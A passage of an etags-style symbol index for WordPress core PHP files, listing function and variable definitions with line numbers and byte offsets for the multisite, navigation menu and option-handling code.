	$u = new WP_User( $user_id );u1804,58501
function update_blog_public( $old_value, $value ) {update_blog_public1821,58851
function get_dashboard_blog() {get_dashboard_blog1836,59247
	if ( $blog = get_site_option( 'dashboard_blog' ) )blog1837,59279
function is_user_option_local( $key, $user_id = 0, $blog_id = 0 ) {is_user_option_local1854,59713
function is_user_option_local( $key, $user_id = 0, $blog_id = 0 ) {user_id1854,59713
	$current_user = wp_get_current_user();current_user1857,59797
	if ( $user_id == 0 )user_id1858,59837
		$user_id = $current_user->ID;user_id1859,59859
	if ( $blog_id == 0 )blog_id1860,59891
		$blog_id = $wpdb->blogid;blog_id1861,59913
	$local_key = $wpdb->get_blog_prefix( $blog_id ) . $key;local_key1863,59942
function users_can_register_signup_filter() {users_can_register_signup_filter1878,60189
	$registration = get_site_option('registration');registration1879,60235
	if ( $registration == 'all' || $registration == 'user' )registration1880,60285
function welcome_user_msg_filter( $text ) {welcome_user_msg_filter1895,60589
		$text = __( 'Dear User,text1898,60730
function force_ssl_content( $force = '' ) {force_ssl_content1924,61215
function force_ssl_content( $force = '' ) {force1924,61215
	static $forced_content;forced_content1925,61259
		$old_forced = $forced_content;old_forced1928,61308
		$forced_content = $force;forced_content1929,61341
function filter_SSL( $url ) {filter_SSL1942,61530
	$arrURL = parse_url( $url );arrURL1946,61662
			$url = str_replace( $arrURL['scheme'], 'https', $url );url1950,61773
function wp_schedule_update_network_counts() {wp_schedule_update_network_counts1961,61951
function wp_update_network_counts() {wp_update_network_counts1974,62273
	$count = $wpdb->get_var( $wpdb->prepare("SELECT COUNT(blog_id) as c FROM $wpdb->blogs WHERE site_id = %d AND spam = '0' AND deleted = '0' and archived = '0'", $wpdb->siteid) );count1977,62327
	$count = $wpdb->get_var( $wpdb->prepare("SELECT COUNT(ID) as c FROM $wpdb->users WHERE spam = '0' AND deleted = '0'") );count1980,62551

wordpress/wp-includes/ms-load.php,2748
function is_subdomain_install() {is_subdomain_install18,289
function wp_get_active_network_plugins() {wp_get_active_network_plugins39,801
	$active_plugins = (array) get_site_option( 'active_sitewide_plugins', array() );active_plugins40,844
	$plugins = array();plugins44,978
	$active_plugins = array_keys( $active_plugins );active_plugins45,999
function ms_site_check() {ms_site_check71,1831
	$check = apply_filters('ms_site_check', null);check75,1916
function get_current_site_name( $current_site ) {get_current_site_name114,3250
function wpmu_current_site() {wpmu_current_site135,3957
		$current_site = new stdClass;current_site139,4090
		$current_site->path   = $path = PATH_CURRENT_SITE;path144,4331
	$current_site = wp_cache_get( 'current_site', 'site-options' );current_site161,4952
	$sites = $wpdb->get_results( "SELECT * FROM $wpdb->site" ); // usually only one sitesites165,5064
		$current_site = $sites[0];current_site167,5181
		$path = $current_site->path;path169,5260
		$current_site = get_current_site_name( $current_site );current_site171,5466
	$path = substr( $_SERVER[ 'REQUEST_URI' ], 0, 1 + strpos( $_SERVER[ 'REQUEST_URI' ], '/', 1 ) );path177,5743
	if ( $domain == $cookie_domain )domain179,5842
		$current_site = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->site WHERE domain = %s AND path = %s", $domain, $path ) );current_site180,5876
		$current_site = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->site WHERE domain IN ( %s, %s ) AND path = %s ORDER BY CHAR_LENGTH( domain ) DESC LIMIT 1", $domain, $cookie_domain, $path ) );current_site182,6013
		if ( $domain == $cookie_domain )domain185,6240
			$current_site = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->site WHERE domain = %s AND path='/'", $domain ) );current_site186,6275
			$current_site = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->site WHERE domain IN ( %s, %s ) AND path = '/' ORDER BY CHAR_LENGTH( domain ) DESC LIMIT 1", $domain, $cookie_domain, $path ) );current_site188,6405
		$path = $current_site->path;path192,6634
		$sitedomain = substr( $domain, 1 + strpos( $domain, '.' ) );sitedomain198,6775
		$current_site = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->site WHERE domain = %s AND path = %s", $sitedomain, $path) );current_site199,6838
		$current_site = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->site WHERE domain = %s AND path='/'", $sitedomain) );current_site205,7083
		$path = '/';path209,7266
function ms_not_installed() {ms_not_installed230,7918
	$title = __( 'Error establishing database connection' );title235,8012
	$msg  = '<h1>' . $title . '</h1>';msg236,8070
	foreach ( $wpdb->tables('global') as $t => $table ) {t248,9382

wordpress/wp-includes/ms-settings.php,2690
 * the Multisite procedural and class library.library4,65
	$domain = addslashes( $_SERVER['HTTP_HOST'] );domain25,669
			$domain = substr( $domain, 0, -3 );domain28,802
			$domain = substr( $domain, 0, -4 );domain31,957
	$domain = rtrim( $domain, '.' );domain39,1194
	$cookie_domain = $domain;cookie_domain40,1228
		$cookie_domain = substr( $cookie_domain, 4 );cookie_domain42,1304
	$path = preg_replace( '|([a-z0-9-]+.php.*)|', '', $_SERVER['REQUEST_URI'] );path44,1353
	$path = str_replace ( '/wp-admin/', '/', $path );path45,1431
	$path = preg_replace( '|(/[a-z0-9-]+?/).*|', '$1', $path );path46,1482
	$current_site = wpmu_current_site();current_site48,1544
		$current_blog = wp_cache_get( 'current_blog_' . $domain, 'site-options' );current_blog53,1833
			$current_blog = get_blog_details( array( 'domain' => $domain ), false );current_blog55,1936
			$current_site = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->site WHERE id = %d", $current_blog->site_id ) );current_site60,2190
			$blogname = substr( $domain, 0, strpos( $domain, '.' ) );blogname64,2542
		$blogname = htmlspecialchars( substr( $_SERVER[ 'REQUEST_URI' ], strlen( $path ) ) );blogname66,2613
			$blogname = substr( $blogname, 0, strpos( $blogname, '/' ) );blogname68,2745
			$blogname = substr( $blogname, 0, strpos( $blogname, '?' ) );blogname70,2854
		$reserved_blognames = array( 'page', 'comments', 'blog', 'wp-admin', 'wp-includes', 'wp-content', 'files', 'feed' );reserved_blognames71,2919
		$current_blog = wp_cache_get( 'current_blog_' . $domain . $path, 'site-options' );current_blog74,3166
			$current_blog = get_blog_details( array( 'domain' => $domain, 'path' => $path ), false );current_blog76,3278
			$destination = NOBLOGREDIRECT;destination85,3655
				$destination = "http://" . $current_site->domain . $current_site->path;destination87,3727
			$destination = 'http://' . $current_site->domain . $current_site->path . 'wp-signup.php?new=' . str_replace( '.' . $current_site->domain, '', $domain );destination89,3814
			$current_blog = get_blog_details( array( 'domain' => $current_site->domain, 'path' => $current_site->path ), false );current_blog101,4268
	$blog_id = $current_blog->blog_id;blog_id107,4464
	$public  = $current_blog->public;public108,4500
	$site_id = $current_blog->site_id;site_id112,4606
	$current_site = get_current_site_name( $current_site );current_site114,4643
			$current_blog->blog_id = $blog_id = 1;blog_id118,4760
			$msg = ! $wpdb->get_var( "SHOW TABLES LIKE '$wpdb->site'" ) ? ' ' . __( 'Database tables are missing.' ) : '';msg121,4846
$table_prefix = $wpdb->get_blog_prefix();table_prefix128,5191

wordpress/wp-includes/nav-menu-template.php,9596
class Walker_Nav_Menu extends Walker {Walker_Nav_Menu17,223
	var $tree_type = array( 'post_type', 'taxonomy', 'custom' );tree_type23,333
	var $tree_type = array( 'post_type', 'taxonomy', 'custom' );tree_type23,333
	var $db_fields = array( 'parent' => 'menu_item_parent', 'id' => 'db_id' );db_fields31,491
	var $db_fields = array( 'parent' => 'menu_item_parent', 'id' => 'db_id' );db_fields31,491
	function start_lvl( &$output, $depth = 0, $args = array() ) {start_lvl40,765
	function start_lvl( &$output, $depth = 0, $args = array() ) {depth40,765
		$indent = str_repeat("\t", $depth);indent41,828
	function end_lvl( &$output, $depth = 0, $args = array() ) {end_lvl52,1116
	function end_lvl( &$output, $depth = 0, $args = array() ) {depth52,1116
		$indent = str_repeat("\t", $depth);indent53,1177
	function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {start_el67,1565
	function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {depth67,1565
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';indent69,1663
		$class_names = $value = '';class_names71,1722
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;classes73,1753
		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );class_names76,1868
		$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';class_names77,1977
		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );id79,2060
		$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';id80,2144
		$attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';attributes84,2263
		$item_output = $args->before;item_output89,2676
	function end_el( &$output, $item, $depth = 0, $args = array() ) {end_el106,3259
	function end_el( &$output, $item, $depth = 0, $args = array() ) {depth106,3259
 * menu_class - CSS class to use for the ul element which forms the menu. Defaults to 'menu'.to117,3524
 * container_class - the class that is applied to the container. Defaults to 'menu-{menu slug}-container'.that120,3818
 * fallback_cb - If the menu doesn't exists, a callback function will fire. Defaults to 'wp_page_menu'. Set to false for no fallback.will122,4003
function wp_nav_menu( $args = array() ) {wp_nav_menu137,4841
function wp_nav_menu( $args = array() ) {args137,4841
	static $menu_id_slugs = array();menu_id_slugs138,4883
	static $menu_id_slugs = array();menu_id_slugs138,4883
	$defaults = array( 'menu' => '', 'container' => 'div', 'container_class' => '', 'container_id' => '', 'menu_class' => 'menu', 'menu_id' => '',defaults140,4918
	$args = wp_parse_args( $args, $defaults );args144,5298
	$args = apply_filters( 'wp_nav_menu_args', $args );args145,5342
	$args = (object) $args;args146,5395
	$menu = wp_get_nav_menu_object( $args->menu );menu149,5470
	if ( ! $menu && $args->theme_location && ( $locations = get_nav_menu_locations() ) && isset( $locations[ $args->theme_location ] ) )locations152,5568
		$menu = wp_get_nav_menu_object( $locations[ $args->theme_location ] );menu153,5702
		$menus = wp_get_nav_menus();menus157,5888
			if ( $menu_items = wp_get_nav_menu_items($menu_maybe->term_id) ) {menu_items159,5957
				$menu = $menu_maybe;menu160,6027
		$menu_items = wp_get_nav_menu_items( $menu->term_id );menu_items168,6176
	// If no fallback function was specified and the menu doesn't exists, bail.was175,6592
	$nav_menu = $items = '';nav_menu179,6723
	$show_container = false;show_container181,6750
		$allowed_tags = apply_filters( 'wp_nav_menu_container_allowedtags', array( 'div', 'nav' ) );allowed_tags183,6803
			$show_container = true;show_container185,6953
			$class = $args->container_class ? ' class="' . esc_attr( $args->container_class ) . '"' : ' class="menu-'. $menu->slug .'-container"';class186,6980
			$id = $args->container_id ? ' id="' . esc_attr( $args->container_id ) . '"' : '';id187,7118
	$sorted_menu_items = array();sorted_menu_items195,7358
	foreach ( (array) $menu_items as $key => $menu_item )key196,7389
	$sorted_menu_items = apply_filters( 'wp_nav_menu_objects', $sorted_menu_items, $args );sorted_menu_items201,7526
		$wrap_id = $args->menu_id;wrap_id208,7770
		$wrap_id = 'menu-' . $menu->slug;wrap_id210,7809
				$wrap_id = preg_replace('#-(\d+)$#', '-' . ++$matches[1], $wrap_id );wrap_id213,7952
				$wrap_id = $wrap_id . '-1';wrap_id215,8034
	$wrap_class = $args->menu_class ? $args->menu_class : '';wrap_class220,8104
	$items = apply_filters( 'wp_nav_menu_items', $items, $args );items223,8228
	$items = apply_filters( "wp_nav_menu_{$menu->slug}_items", $items, $args );items224,8291
	$nav_menu = apply_filters( 'wp_nav_menu', $nav_menu, $args );nav_menu232,8558
 * Add the class property classes for the current context, if applicable.property241,8693
 * @param array $menu_items The current menu item objects to which to add the class property information.property246,8806
function _wp_menu_item_classes_by_context( &$menu_items ) {_wp_menu_item_classes_by_context248,8916
	$queried_object = $wp_query->get_queried_object();queried_object251,8996
	$queried_object_id = (int) $wp_query->queried_object_id;queried_object_id252,9048
	$active_object = '';active_object254,9107
	$active_ancestor_item_ids = array();active_ancestor_item_ids255,9129
	$active_parent_item_ids = array();active_parent_item_ids256,9167
	$active_parent_object_ids = array();active_parent_object_ids257,9203
	$possible_taxonomy_ancestors = array();possible_taxonomy_ancestors258,9241
	$possible_object_parents = array();possible_object_parents259,9282
	$home_page_id = (int) get_option( 'page_for_posts' );home_page_id260,9319
				$term_hierarchy = _get_term_hierarchy( $taxonomy );term_hierarchy265,9649
				$terms = wp_get_object_terms( $queried_object_id, $taxonomy, array( 'fields' => 'ids' ) );terms266,9705
					$possible_object_parents = array_merge( $possible_object_parents, $terms );possible_object_parents268,9832
					$term_to_ancestor = array();term_to_ancestor269,9913
					foreach ( (array) $term_hierarchy as $anc => $descs ) {anc270,9947
								$_desc = $term_to_ancestor[ $desc ];_desc279,10258
								$desc = $_desc;desc281,10348
								$desc = 0;desc283,10388
		$term_hierarchy = _get_term_hierarchy( $queried_object->taxonomy );term_hierarchy293,10739
		$term_to_ancestor = array();term_to_ancestor294,10809
		foreach ( (array) $term_hierarchy as $anc => $descs ) {anc295,10840
		$desc = $queried_object->term_id;desc299,10980
				$_desc = $term_to_ancestor[ $desc ];_desc303,11143
				$desc = $_desc;desc305,11225
				$desc = 0;desc307,11257
	$possible_object_parents = array_filter( $possible_object_parents );possible_object_parents312,11313
	$front_page_url = home_url();front_page_url314,11384
	foreach ( (array) $menu_items as $key => $menu_item ) {key316,11416
		$classes = (array) $menu_item->classes;classes320,11513
			$active_object = $queried_object->post_type;active_object329,12051
				( ! empty( $home_page_id ) && 'post_type' == $menu_item->type && $wp_query->is_home && $home_page_id == $menu_item->object_id ) ||home_page_id335,12251
			$_anc_id = (int) $menu_item->db_id;_anc_id342,12652
				( $_anc_id = get_post_meta( $_anc_id, '_menu_item_menu_item_parent', true ) ) &&_anc_id345,12702
			$active_object = $menu_item->object;active_object359,13294
			$_root_relative_current = untrailingslashit( $_SERVER['REQUEST_URI'] );_root_relative_current363,13448
			$current_url = ( is_ssl() ? 'https://' : 'http://' ) . $_SERVER['HTTP_HOST'] . $_root_relative_current;current_url364,13523
			$raw_item_url = strpos( $menu_item->url, '#' ) ? substr( $menu_item->url, 0, strpos( $menu_item->url, '#' ) ) : $menu_item->url;raw_item_url365,13630
			$item_url = untrailingslashit( $raw_item_url );item_url366,13762
			$_indexless_current = untrailingslashit( preg_replace( '/index.php$/', '', $current_url ) );_indexless_current367,13813
				$_anc_id = (int) $menu_item->db_id;_anc_id372,14107
					( $_anc_id = get_post_meta( $_anc_id, '_menu_item_menu_item_parent', true ) ) &&_anc_id375,14159
				$active_object = $menu_item->object;active_object387,14718
			// give front page item current-menu-item class when extra query arguments involvedwhen389,14760
			} elseif ( $item_url == $front_page_url && is_front_page() ) {item_url390,14847
		if ( ! empty( $home_page_id ) && 'post_type' == $menu_item->type && empty( $wp_query->is_page ) && $home_page_id == $menu_item->object_id )home_page_id399,15160
	$active_ancestor_item_ids = array_filter( array_unique( $active_ancestor_item_ids ) );active_ancestor_item_ids404,15402
	$active_parent_item_ids = array_filter( array_unique( $active_parent_item_ids ) );active_parent_item_ids405,15490
	$active_parent_object_ids = array_filter( array_unique( $active_parent_object_ids ) );active_parent_object_ids406,15574
	foreach ( (array) $menu_items as $key => $parent_item ) {key409,15686
		$classes = (array) $parent_item->classes;classes410,15745
function walk_nav_menu_tree( $items, $depth, $r ) {walk_nav_menu_tree471,17856
	$walker = ( empty($r->walker) ) ? new Walker_Nav_Menu : $r->walker;walker472,17908
	$args = array( $items, $depth, $r );args473,17977
function _nav_menu_item_id_use_once( $id, $item ) {_nav_menu_item_id_use_once484,18188
	static $_used_ids = array();_used_ids485,18240
	static $_used_ids = array();_used_ids485,18240

wordpress/wp-includes/nav-menu.php,8297
function wp_get_nav_menu_object( $menu ) {wp_get_nav_menu_object21,368
	$menu_obj = get_term( $menu, 'nav_menu' );menu_obj25,444
		$menu_obj = get_term_by( 'slug', $menu, 'nav_menu' );menu_obj28,509
		$menu_obj = get_term_by( 'name', $menu, 'nav_menu' );menu_obj31,586
		$menu_obj = false;menu_obj34,663
function is_nav_menu( $menu ) {is_nav_menu49,936
	$menu_obj = wp_get_nav_menu_object( $menu );menu_obj53,1001
function register_nav_menus( $locations = array() ) {register_nav_menus73,1392
function register_nav_menus( $locations = array() ) {locations73,1392
	$_wp_registered_nav_menus = array_merge( (array) $_wp_registered_nav_menus, $locations );_wp_registered_nav_menus78,1514
function unregister_nav_menu( $location ) {unregister_nav_menu88,1774
function register_nav_menu( $location, $description ) {register_nav_menu106,2237
	register_nav_menus( array( $location => $description ) );location107,2293
function get_registered_nav_menus() {get_registered_nav_menus115,2464
function get_nav_menu_locations() {get_nav_menu_locations129,2775
function has_nav_menu( $location ) {has_nav_menu140,3055
	$locations = get_nav_menu_locations();locations141,3092
function is_nav_menu_item( $menu_item_id = 0 ) {is_nav_menu_item153,3399
function is_nav_menu_item( $menu_item_id = 0 ) {menu_item_id153,3399
function wp_create_nav_menu( $menu_name ) {wp_create_nav_menu165,3709
function wp_delete_nav_menu( $menu ) {wp_delete_nav_menu177,3987
	$menu = wp_get_nav_menu_object( $menu );menu178,4026
	$menu_objects = get_objects_in_term( $menu->term_id, 'nav_menu' );menu_objects182,4101
	$result = wp_delete_term( $menu->term_id, 'nav_menu' );result189,4279
function wp_update_nav_menu_object( $menu_id = 0, $menu_data = array() ) {wp_update_nav_menu_object206,4743
function wp_update_nav_menu_object( $menu_id = 0, $menu_data = array() ) {menu_id206,4743
	$menu_id = (int) $menu_id;menu_id207,4818
	$_menu = wp_get_nav_menu_object( $menu_id );_menu209,4847
	$args = array(args211,4894
	$_possible_existing = get_term_by( 'name', $menu_data['menu-name'], 'nav_menu' );_possible_existing219,5299
		$menu_exists = get_term_by( 'name', $menu_data['menu-name'], 'nav_menu' );menu_exists230,5825
		$_menu = wp_insert_term( $menu_data['menu-name'], 'nav_menu', $args );_menu235,6110
	$menu_id = (int) $_menu->term_id;menu_id248,6401
	$update_response = wp_update_term( $menu_id, 'nav_menu', $args );update_response250,6437
function wp_update_nav_menu_item( $menu_id = 0, $menu_item_db_id = 0, $menu_item_data = array() ) {wp_update_nav_menu_item269,7055
function wp_update_nav_menu_item( $menu_id = 0, $menu_item_db_id = 0, $menu_item_data = array() ) {menu_id269,7055
	$menu_id = (int) $menu_id;menu_id270,7155
	$menu_item_db_id = (int) $menu_item_db_id;menu_item_db_id271,7183
	$menu = wp_get_nav_menu_object( $menu_id );menu277,7505
	$menu_items = 0 == $menu_id ? array() : (array) wp_get_nav_menu_items( $menu_id, array( 'post_status' => 'publish,draft' ) );menu_items282,7630
	$count = count( $menu_items );count284,7758
	$defaults = array(defaults286,7791
	$args = wp_parse_args( $menu_item_data, $defaults );args303,8233
		$last_item = array_pop( $menu_items );last_item308,8402
	$original_parent = 0 < $menu_item_db_id ? get_post_field( 'post_parent', $menu_item_db_id ) : 0;original_parent312,8568
		$original_title = '';original_title322,8874
			$original_parent = get_term_field( 'parent', $args['menu-item-object-id'], $args['menu-item-object'], 'raw' );original_parent324,8947
			$original_title = get_term_field( 'name', $args['menu-item-object-id'], $args['menu-item-object'], 'raw' );original_title325,9061
			$original_object = get_post( $args['menu-item-object-id'] );original_object328,9229
			$original_parent = (int) $original_object->post_parent;original_parent329,9293
			$original_title = $original_object->post_title;original_title330,9352
	$post = array(post343,9749
		$menu_item_db_id = wp_insert_post( $post );menu_item_db_id360,10342
	$menu_item_db_id = (int) $menu_item_db_id;menu_item_db_id377,10837
function wp_get_nav_menus( $args = array() ) {wp_get_nav_menus409,12315
function wp_get_nav_menus( $args = array() ) {args409,12315
	$defaults = array( 'hide_empty' => false, 'orderby' => 'none' );defaults410,12362
	$args = wp_parse_args( $args, $defaults );args411,12428
function _sort_nav_menu_items( $a, $b ) {_sort_nav_menu_items425,12851
	$_a = (int) $a->$_menu_item_sort_prop;_a434,13075
	$_b = (int) $b->$_menu_item_sort_prop;_b435,13115
	elseif ( $_a == $a->$_menu_item_sort_prop && $_b == $b->$_menu_item_sort_prop )_a439,13231
function _is_valid_nav_menu_item( $item ) {_is_valid_nav_menu_item454,13615
function wp_get_nav_menu_items( $menu, $args = array() ) {wp_get_nav_menu_items470,13932
function wp_get_nav_menu_items( $menu, $args = array() ) {args470,13932
	$menu = wp_get_nav_menu_object( $menu );menu473,14029
	static $fetched = array();fetched478,14105
	static $fetched = array();fetched478,14105
	$items = get_objects_in_term( $menu->term_id, 'nav_menu' );items480,14134
	$defaults = array( 'order' => 'ASC', 'orderby' => 'menu_order', 'post_type' => 'nav_menu_item',defaults485,14238
	$args = wp_parse_args( $args, $defaults );args488,14475
	$items = get_posts( $args );items494,14631
		$posts = array();posts502,14899
		$terms = array();terms503,14919
			$object_id = get_post_meta( $item->ID, '_menu_item_object_id', true );object_id505,14971
			$object    = get_post_meta( $item->ID, '_menu_item_object',    true );object506,15045
			$type      = get_post_meta( $item->ID, '_menu_item_type',      true );type507,15119
	$items = array_map( 'wp_setup_nav_menu_item', $items );items530,15755
		$items = array_filter( $items, '_is_valid_nav_menu_item' );items533,15875
		$i = 1;i538,16074
		foreach( $items as $k => $item ) {k539,16084
 * - classes:		The array of class attribute values for the link element of this menu item.attribute562,17293
function wp_setup_nav_menu_item( $menu_item ) {wp_setup_nav_menu_item571,17668
				$object = get_post_type_object( $menu_item->object );object581,18483
				$original_object = get_post( $menu_item->object_id );original_object591,18791
				$original_title = $original_object->post_title;original_title592,18849
				$object = get_taxonomy( $menu_item->object );object596,19048
				$term_url = get_term_link( (int) $menu_item->object_id, $menu_item->object );term_url604,19285
				$original_title = get_term_field( 'name', $menu_item->object_id, $menu_item->object, 'raw' );original_title607,19434
					$original_title = false;original_title609,19574
			$object = get_post_type_object( $menu_item->post_type );object633,20818
		$object = get_taxonomy( $menu_item->taxonomy );object654,21605
function wp_get_associated_nav_menu_items( $object_id = 0, $object_type = 'post_type' ) {wp_get_associated_nav_menu_items680,22450
function wp_get_associated_nav_menu_items( $object_id = 0, $object_type = 'post_type' ) {object_id680,22450
	$object_id = (int) $object_id;object_id681,22540
	$menu_item_ids = array();menu_item_ids682,22572
	$query = new WP_Query;query684,22600
	$menu_items = $query->query(menu_items685,22624
function _wp_delete_post_menu_item( $object_id = 0 ) {_wp_delete_post_menu_item715,23342
function _wp_delete_post_menu_item( $object_id = 0 ) {object_id715,23342
	$object_id = (int) $object_id;object_id716,23397
	$menu_item_ids = wp_get_associated_nav_menu_items( $object_id, 'post_type' );menu_item_ids718,23430
function _wp_delete_tax_menu_item( $object_id = 0 ) {_wp_delete_tax_menu_item734,23807
function _wp_delete_tax_menu_item( $object_id = 0 ) {object_id734,23807
	$object_id = (int) $object_id;object_id735,23861
	$menu_item_ids = wp_get_associated_nav_menu_items( $object_id, 'taxonomy' );menu_item_ids737,23894
function _wp_auto_add_pages_to_menu( $new_status, $old_status, $post ) {_wp_auto_add_pages_to_menu755,24436
	$auto_add = get_option( 'nav_menu_options' );auto_add760,24658
	$auto_add = $auto_add['auto_add'];auto_add763,24805
	$args = array(args767,24906
		$items = wp_get_nav_menu_items( $menu_id, array( 'post_status' => 'publish,draft' ) );items775,25114

wordpress/wp-includes/option.php,13277
function get_option( $option, $default = false ) {get_option32,1145
function get_option( $option, $default = false ) {default32,1145
	$pre = apply_filters( 'pre_option_' . $option, false );pre36,1256
	$option = trim($option);option40,1352
		$notoptions = wp_cache_get( 'notoptions', 'options' );notoptions49,1578
		$alloptions = wp_load_alloptions();alloptions53,1741
			$value = $alloptions[$option];value56,1821
			$value = wp_cache_get( $option, 'options' );value58,1866
				$row = $wpdb->get_row( $wpdb->prepare( "SELECT option_value FROM $wpdb->options WHERE option_name = %s LIMIT 1", $option ) );row61,1944
					$value = $row->option_value;value65,2198
		$suppress = $wpdb->suppress_errors();suppress75,2541
		$row = $wpdb->get_row( $wpdb->prepare( "SELECT option_value FROM $wpdb->options WHERE option_name = %s LIMIT 1", $option ) );row76,2581
			$value = $row->option_value;value79,2775
		$value = untrailingslashit( $value );value89,3080
function wp_protect_special_option( $option ) {wp_protect_special_option106,3480
	$protected = array( 'alloptions', 'notoptions' );protected107,3528
function form_option( $option ) {form_option122,3920
function wp_load_alloptions() {wp_load_alloptions135,4183
		$alloptions = wp_cache_get( 'alloptions', 'options' );alloptions139,4286
		$alloptions = false;alloptions141,4349
		$suppress = $wpdb->suppress_errors();suppress144,4396
			$alloptions_db = $wpdb->get_results( "SELECT option_name, option_value FROM $wpdb->options" );alloptions_db146,4563
		$alloptions = array();alloptions148,4698
function wp_load_core_site_options( $site_id = null ) {wp_load_core_site_options168,5258
function wp_load_core_site_options( $site_id = null ) {site_id168,5258
		$site_id = $wpdb->siteid;site_id175,5479
	$core_options = array('site_name', 'siteurl', 'active_sitewide_plugins', '_site_transient_timeout_theme_roots', '_site_transient_theme_roots', 'site_admins', 'can_compress_scripts', 'global_terms_enabled' );core_options177,5508
	$core_options_in = "'" . implode("', '", $core_options) . "'";core_options_in179,5718
	$options = $wpdb->get_results( $wpdb->prepare("SELECT meta_key, meta_value FROM $wpdb->sitemeta WHERE meta_key IN ($core_options_in) AND site_id = %d", $site_id) );options180,5782
		$key = $option->meta_key;key183,5984
		$cache_key = "{$site_id}:$key";cache_key184,6012
function update_option( $option, $newvalue ) {update_option215,7289
	$option = trim($option);option218,7352
		$newvalue = clone $newvalue;newvalue225,7487
	$newvalue = sanitize_option( $option, $newvalue );newvalue227,7519
	$oldvalue = get_option( $option );oldvalue228,7571
	$newvalue = apply_filters( 'pre_update_option_' . $option, $newvalue, $oldvalue );newvalue229,7607
	if ( $newvalue === $oldvalue )newvalue232,7755
	$notoptions = wp_cache_get( 'notoptions', 'options' );notoptions238,7876
	$_newvalue = $newvalue;_newvalue244,8092
	$newvalue = maybe_serialize( $newvalue );newvalue245,8117
		$alloptions = wp_load_alloptions();alloptions249,8263
	$result = $wpdb->update( $wpdb->options, array( 'option_value' => $newvalue ), array( 'option_name' => $option ) );result258,8507
function add_option( $option, $value = '', $deprecated = '', $autoload = 'yes' ) {add_option293,10006
function add_option( $option, $value = '', $deprecated = '', $autoload = 'yes' ) {value293,10006
	$option = trim($option);option299,10183
		$value = clone $value;value306,10315
	$value = sanitize_option( $option, $value );value308,10341
	$notoptions = wp_cache_get( 'notoptions', 'options' );notoptions311,10501
	$_value = $value;_value316,10683
	$value = maybe_serialize( $value );value317,10702
	$autoload = ( 'no' === $autoload ) ? 'no' : 'yes';autoload318,10739
			$alloptions = wp_load_alloptions();alloptions322,10906
	$notoptions = wp_cache_get( 'notoptions', 'options' ); // yes, again... we need it to be freshnotoptions331,11129
	$result = $wpdb->query( $wpdb->prepare( "INSERT INTO `$wpdb->options` (`option_name`, `option_value`, `autoload`) VALUES (%s, %s, %s) ON DUPLICATE KEY UPDATE `option_name` = VALUES(`option_name`), `option_value` = VALUES(`option_value`), `autoload` = VALUES(`autoload`)", $option, $value, $autoload ) );result337,11385
function delete_option( $option ) {delete_option360,12326
	$row = $wpdb->get_row( $wpdb->prepare( "SELECT autoload FROM $wpdb->options WHERE option_name = %s", $option ) );row366,12455
	$result = $wpdb->delete( $wpdb->options, array( 'option_name' => $option ) );result370,12650
			$alloptions = wp_load_alloptions();alloptions373,12803
function delete_transient( $transient ) {delete_transient403,13600
		$result = wp_cache_delete( $transient, 'transient' );result409,13779
		$option_timeout = '_transient_timeout_' . $transient;option_timeout411,13845
		$option = '_transient_' . $transient;option412,13901
		$result = delete_option( $option );result413,13941
function get_transient( $transient ) {get_transient442,14777
	$pre = apply_filters( 'pre_transient_' . $transient, false );pre445,14854
		$value = wp_cache_get( $transient, 'transient' );value450,14994
		$transient_option = '_transient_' . $transient;transient_option452,15056
			$alloptions = wp_load_alloptions();alloptions455,15228
				$transient_timeout = '_transient_timeout_' . $transient;transient_timeout457,15320
		$value = get_option( $transient_option );value466,15555
function set_transient( $transient, $value, $expiration = 0 ) {set_transient491,16423
function set_transient( $transient, $value, $expiration = 0 ) {expiration491,16423
	$value = apply_filters( 'pre_set_transient_' . $transient, $value );value494,16525
		$result = wp_cache_set( $transient, $value, 'transient', $expiration );result497,16634
		$transient_timeout = '_transient_timeout_' . $transient;transient_timeout499,16718
		$transient = '_transient_' . $transient;transient500,16777
			$autoload = 'yes';autoload502,16866
				$autoload = 'no';autoload504,16912
			$result = add_option( $transient, $value, '', $autoload );result507,17009
			$result = update_option( $transient, $value );result511,17167
 * Saves and restores user interface settings stored in a cookie.settings522,17362
function wp_user_settings() {wp_user_settings532,17675
	if ( ! $user = wp_get_current_user() )user540,17779
	$settings = get_user_option( 'user-settings', $user->ID );settings543,17830
		$cookie = preg_replace( '/[^A-Za-z0-9=&_]/', '', $_COOKIE['wp-settings-' . $user->ID] );cookie546,17947
			if ( $cookie == $settings )cookie549,18095
			$last_time = (int) get_user_option( 'user-settings-time', $user->ID );last_time552,18139
			$saved = isset( $_COOKIE['wp-settings-time-' . $user->ID]) ? preg_replace( '/[^0-9]/', '', $_COOKIE['wp-settings-time-' . $user->ID] ) : 0;saved553,18213
 * Retrieve user interface setting value based on setting name.setting569,18798
function get_user_setting( $name, $default = false ) {get_user_setting579,19155
function get_user_setting( $name, $default = false ) {default579,19155
	$all = get_all_user_settings();all581,19211
 * Add or update user interface setting.setting587,19305
 * This function has to be used before any output has started as it calls setcookie().has590,19431
function set_user_setting( $name, $value ) {set_user_setting600,19742
	$all = get_all_user_settings();all605,19828
	$name = preg_replace( '/[^A-Za-z0-9_]+/', '', $name );name606,19861
 * Delete user interface settings.settings617,20027
 * This function has to be used before any output has started as it calls setcookie().has620,20120
function delete_user_setting( $names ) {delete_user_setting629,20416
	$all = get_all_user_settings();all634,20498
	$names = (array) $names;names635,20531
			$deleted = true;deleted640,20642
 * Retrieve all user interface settings.settings651,20758
function get_all_user_settings() {get_all_user_settings659,20931
	if ( ! $user = wp_get_current_user() )user662,21000
	$all = array();all668,21170
